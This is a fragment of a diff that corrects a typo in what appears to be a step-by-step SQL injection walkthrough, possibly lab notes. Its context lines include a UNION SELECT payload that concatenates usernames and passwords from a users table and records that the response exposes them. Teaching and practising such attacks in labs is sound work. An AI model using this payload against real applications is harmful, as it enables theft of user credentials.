@@ -42,7 +42,7 @@ Step 11: Add another NULL to query
 
 Step 12: Get two columns into one : 1 UNION SELECT username || '=' || password FROM users  
 
-Reslut: response have usernames and passwords.
+Result: response have usernames and passwords.
 
 Step 13: 
 
